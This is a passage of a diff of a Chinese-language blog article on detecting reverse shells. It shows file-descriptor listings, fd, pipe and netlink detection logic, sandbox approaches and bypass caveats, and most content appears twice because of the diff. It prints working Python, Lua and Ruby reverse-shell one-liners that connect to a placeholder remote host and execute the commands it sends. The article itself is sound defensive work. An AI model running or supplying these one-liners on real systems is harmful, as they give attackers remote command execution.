-lr-x------. 1 root root 64 Feb 13 19:20 0 -&gt; pipe:[29106145]
-l-wx------. 1 root root 64 Feb 13 19:20 1 -&gt; pipe:[29106146]
-l-wx------. 1 root root 64 Feb 13 19:20 2 -&gt; pipe:[29106146]
-lrwx------. 1 root root 64 Feb 13 19:20 3 -&gt; socket:[29107406]
-lrwx------. 1 root root 64 Feb 13 19:20 4 -&gt; socket:[29107407]
-lrwx------. 1 root root 64 Feb 13 19:20 5 -&gt; socket:[29107408]
-lrwx------. 1 root root 64 Feb 13 19:20 6 -&gt; /dev/ptmx
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 17:29 0 -&gt; socket:[1283078]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 17:29 1 -&gt; socket:[1283078]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 17:29 2 -&gt; socket:[1283078]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 17:29 3 -&gt; socket:[1283078]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 17:29 4 -&gt; /dev/ptmx</span><br><span class="line"></span><br><span class="line">socat-pty</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:20 0 -&gt; pipe:[29106145]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:20 1 -&gt; pipe:[29106146]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:20 2 -&gt; pipe:[29106146]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:20 3 -&gt; socket:[29107406]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:20 4 -&gt; socket:[29107407]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:20 5 -&gt; socket:[29107408]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:20 6 -&gt; /dev/ptmx</span><br><span class="line"></span><br><span class="line">socat-exec </span><br><span class="line">lr-x------. 1 root root 64 Feb 13 19:23 0 -&gt; pipe:[29118853]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:23 1 -&gt; pipe:[29118854]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 19:23 2 -&gt; pipe:[29118854]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:23 3 -&gt; socket:[29119524]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:23 4 -&gt; socket:[29119525]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:23 5 -&gt; /dev/ptmx</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 19:23 6 -&gt; socket:[29119528]</span><br></pre></td></tr></table></figure>
 
-socat-exec 
-lr-x------. 1 root root 64 Feb 13 19:23 0 -&gt; pipe:[29118853]
-l-wx------. 1 root root 64 Feb 13 19:23 1 -&gt; pipe:[29118854]
-l-wx------. 1 root root 64 Feb 13 19:23 2 -&gt; pipe:[29118854]
-lrwx------. 1 root root 64 Feb 13 19:23 3 -&gt; socket:[29119524]
-lrwx------. 1 root root 64 Feb 13 19:23 4 -&gt; socket:[29119525]
-lrwx------. 1 root root 64 Feb 13 19:23 5 -&gt; /dev/ptmx
-lrwx------. 1 root root 64 Feb 13 19:23 6 -&gt; socket:[29119528]
-</code></pre>
 <p>通过伪终端中转与通过管道等中转原理一样，但通过伪终端中转的检测难度大大提升，单从Shell的标准输入输出来看，和正常打开的终端没有什么区别。此外，一些场景如容器、各类产品Agent等也会有相似的日志记录，平衡漏报与误报的难度上大大提升。因此需要在文件描述符合检测方案的基础上，结合进程、网络等多种日志信息综合分析</p>
 <h4 id="c-编程语言实现标准输入中转，重定向命令执行的输入到中转"><a href="#c-编程语言实现标准输入中转，重定向命令执行的输入到中转" class="headerlink" title="c. 编程语言实现标准输入中转，重定向命令执行的输入到中转"></a>c. 编程语言实现标准输入中转，重定向命令执行的输入到中转</h4><p><strong>常见场景</strong></p>
-<pre><code>1) python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#39;Rhost&#39;,Rport))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), Shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1) python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;Rhost&#x27;,Rport))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), Shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br><span class="line"></span><br><span class="line">2) lua5.1 -e &#x27;local host, port = &quot;Rhost&quot;, Rport local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#x27;</span><br><span class="line"></span><br><span class="line">3) ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;Rhost&quot;,&quot;Rport&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
 
-2) lua5.1 -e &#39;local host, port = &quot;Rhost&quot;, Rport local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#39;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ruby</span><br><span class="line"></span><br><span class="line">lr-x------. 1 root root 64 Feb 13 18:37 0 -&gt; pipe:[1319065]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:37 1 -&gt; pipe:[1319066]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:37 2 -&gt; pipe:[1319066]</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 18:37 3 -&gt; pipe:[1319358]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:37 4 -&gt; pipe:[1319358]</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 18:37 5 -&gt; pipe:[1319359]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:37 6 -&gt; pipe:[1319359]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:37 7 -&gt; socket:[1319360]</span><br><span class="line"></span><br><span class="line">lua</span><br><span class="line">lr-x------. 1 root root 64 Feb 13 18:41 0 -&gt; pipe:[2720451]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:41 1 -&gt; pipe:[2720452]</span><br><span class="line">l-wx------. 1 root root 64 Feb 13 18:41 2 -&gt; pipe:[2720452]</span><br><span class="line">lrwx------. 1 root root 64 Feb 13 18:41 3 -&gt; socket:[2972610]</span><br></pre></td></tr></table></figure>
 
-3) ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;Rhost&quot;,&quot;Rport&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;
-</code></pre>
-<pre><code>ruby
-
-lr-x------. 1 root root 64 Feb 13 18:37 0 -&gt; pipe:[1319065]
-l-wx------. 1 root root 64 Feb 13 18:37 1 -&gt; pipe:[1319066]
-l-wx------. 1 root root 64 Feb 13 18:37 2 -&gt; pipe:[1319066]
-lr-x------. 1 root root 64 Feb 13 18:37 3 -&gt; pipe:[1319358]
-l-wx------. 1 root root 64 Feb 13 18:37 4 -&gt; pipe:[1319358]
-lr-x------. 1 root root 64 Feb 13 18:37 5 -&gt; pipe:[1319359]
-l-wx------. 1 root root 64 Feb 13 18:37 6 -&gt; pipe:[1319359]
-lrwx------. 1 root root 64 Feb 13 18:37 7 -&gt; socket:[1319360]
-
-lua
-lr-x------. 1 root root 64 Feb 13 18:41 0 -&gt; pipe:[2720451]
-l-wx------. 1 root root 64 Feb 13 18:41 1 -&gt; pipe:[2720452]
-l-wx------. 1 root root 64 Feb 13 18:41 2 -&gt; pipe:[2720452]
-lrwx------. 1 root root 64 Feb 13 18:41 3 -&gt; socket:[2972610]
-</code></pre>
 <p>这种场景下，反弹Shell的命令执行和正常业务行为变得更加难以区分，对抗程度上升</p>
 <p><strong>检测思路：</strong> 这类常见可结合进程命令行特征+异常命令行为序列+异常shell启动模型</p>
-<pre><code>异常命令行为序列：通过分析命令序列与攻击者获取Shell后行为相似度来判定是否为反弹Shell
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">异常命令行为序列：通过分析命令序列与攻击者获取Shell后行为相似度来判定是否为反弹Shell</span><br><span class="line"></span><br><span class="line">异常shell启动模型：结合多维度特征以及机器历史行为综合判定产出告警</span><br></pre></td></tr></table></figure>
 
-异常shell启动模型：结合多维度特征以及机器历史行为综合判定产出告警
-</code></pre>
 <h3 id="3-纵深检测"><a href="#3-纵深检测" class="headerlink" title="3. 纵深检测"></a>3. 纵深检测</h3><h4 id="a-分类检测"><a href="#a-分类检测" class="headerlink" title="a. 分类检测"></a>a. 分类检测</h4><p>FD检测技术、从行为目的出发的异常命令行为序列检测技术、异常Shell启动检测和常规的命令、网络特征</p>
-<h4 id="b-脚本沙箱"><a href="#b-脚本沙箱" class="headerlink" title="b. 脚本沙箱"></a>b. 脚本沙箱</h4><pre><code>1) 落盘脚本文件: 检测的语言包括但不限于Bash、Python、Perl、Vbs、PowerShell、Bat、JAR等
+<h4 id="b-脚本沙箱"><a href="#b-脚本沙箱" class="headerlink" title="b. 脚本沙箱"></a>b. 脚本沙箱</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 落盘脚本文件: 检测的语言包括但不限于Bash、Python、Perl、Vbs、PowerShell、Bat、JAR等</span><br><span class="line"></span><br><span class="line">2) 混淆类样本: 通过每种语言的Trace模式，动态解混淆后进行检测</span><br><span class="line"></span><br><span class="line">3) JAR打包类文件: 进行静态反编译并结合动态的运行进行多维度判定</span><br><span class="line"></span><br><span class="line">4) 无文件攻击: 命令序列分析</span><br></pre></td></tr></table></figure>
 
-2) 混淆类样本: 通过每种语言的Trace模式，动态解混淆后进行检测
-
-3) JAR打包类文件: 进行静态反编译并结合动态的运行进行多维度判定
-
-4) 无文件攻击: 命令序列分析
-</code></pre>
 <h4 id="c-二进制沙箱"><a href="#c-二进制沙箱" class="headerlink" title="c. 二进制沙箱"></a>c. 二进制沙箱</h4><p>对于常见的C&#x2F;C++、Go、MeterPreter Shellcode等二进制反弹Shell开发方式进行了特殊的识别和处理，综合导入函数特征、代码特征、二进制在沙箱中的动态行为特征等多个维度进行检测</p>
 <h4 id="d-对抗行为检测"><a href="#d-对抗行为检测" class="headerlink" title="d. 对抗行为检测"></a>d. 对抗行为检测</h4><p>针对常见绕过方式，如替换系统Shell、命令编码等，作为辅助手段提升检测效果</p>
-<h2 id="0x03-检测总结"><a href="#0x03-检测总结" class="headerlink" title="0x03 检测总结"></a>0x03 检测总结</h2><h3 id="1-进程-file-descriptor-检测"><a href="#1-进程-file-descriptor-检测" class="headerlink" title="1. 进程 file descriptor 检测"></a>1. 进程 file descriptor 检测</h3><pre><code>1) 检测 file descriptor 是否指向一个socket
+<h2 id="0x03-检测总结"><a href="#0x03-检测总结" class="headerlink" title="0x03 检测总结"></a>0x03 检测总结</h2><h3 id="1-进程-file-descriptor-检测"><a href="#1-进程-file-descriptor-检测" class="headerlink" title="1. 进程 file descriptor 检测"></a>1. 进程 file descriptor 检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1) 检测 file descriptor 是否指向一个socket</span><br><span class="line"></span><br><span class="line">以“重定向符”+&quot;/dev/tcp网络通信&quot;Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为file descriptor的重定向到一个socket句柄</span><br><span class="line"></span><br><span class="line">2) 检测 file descriptor 是否指向一个管道符（pipe）</span><br><span class="line"></span><br><span class="line">对于利用“管道符”传递指令的反弹shell攻击方式来说，这类反弹shell的本质可以归纳为file descriptor的重定向到一个pipe句柄；不管做了多少层的pipe，反弹shell的本质是将server的输入传递给client的bash，因此肯定存在socket连接。</span><br><span class="line"></span><br><span class="line">只需要根据pid追溯pipe上游的进程，并判断其进程fd，检查是否是来自一个socket。例如，跟踪pipe，发现pipe的进程建立了socket连接，那么就存在反弹shell的风险</span><br></pre></td></tr></table></figure>
 
-以“重定向符”+&quot;/dev/tcp网络通信&quot;Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为file descriptor的重定向到一个socket句柄
+<h3 id="2-netlink监控-fd异常检测"><a href="#2-netlink监控-fd异常检测" class="headerlink" title="2. netlink监控+fd异常检测"></a>2. netlink监控+fd异常检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 监听Netlink Socket，实时获取进程EXEC事件。</span><br><span class="line"></span><br><span class="line">2) 如果为Shell进程，检查进程启动打开的FD，</span><br><span class="line">   - 打开了Socket</span><br><span class="line">   - 未使用/dev/tty、/dev/pts/n、/dev/ptmx等终端</span><br><span class="line"></span><br><span class="line">确认为反弹Shell </span><br></pre></td></tr></table></figure>
 
-2) 检测 file descriptor 是否指向一个管道符（pipe）
-
-对于利用“管道符”传递指令的反弹shell攻击方式来说，这类反弹shell的本质可以归纳为file descriptor的重定向到一个pipe句柄；不管做了多少层的pipe，反弹shell的本质是将server的输入传递给client的bash，因此肯定存在socket连接。
-
-只需要根据pid追溯pipe上游的进程，并判断其进程fd，检查是否是来自一个socket。例如，跟踪pipe，发现pipe的进程建立了socket连接，那么就存在反弹shell的风险
-</code></pre>
-<h3 id="2-netlink监控-fd异常检测"><a href="#2-netlink监控-fd异常检测" class="headerlink" title="2. netlink监控+fd异常检测"></a>2. netlink监控+fd异常检测</h3><pre><code>1) 监听Netlink Socket，实时获取进程EXEC事件。
-
-2) 如果为Shell进程，检查进程启动打开的FD，
-   - 打开了Socket
-   - 未使用/dev/tty、/dev/pts/n、/dev/ptmx等终端
-
-确认为反弹Shell 
-</code></pre>
 <p>绕过风险：仅能通过进程执行文件名判断是否为Shell进程，上传可执行文件、拷贝Bash文件到其他路径等方法会绕过这个方法</p>
-<h3 id="3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测"><a href="#3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测" class="headerlink" title="3. 脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测"></a>3. 脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测</h3><pre><code>python/perl实现纯代码形式的反弹shell文件执行：文件脚本检测
-python/perl实现纯代码形式的反弹shell命令行指令（fileless）：纯命令行fileless检测
-C/C++实现纯代码形式的反弹shell：二进制文件检测
-</code></pre>
+<h3 id="3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测"><a href="#3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测" class="headerlink" title="3. 脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测"></a>3. 脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python/perl实现纯代码形式的反弹shell文件执行：文件脚本检测</span><br><span class="line">python/perl实现纯代码形式的反弹shell命令行指令（fileless）：纯命令行fileless检测</span><br><span class="line">C/C++实现纯代码形式的反弹shell：二进制文件检测</span><br></pre></td></tr></table></figure>
+
 <h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
 </li>
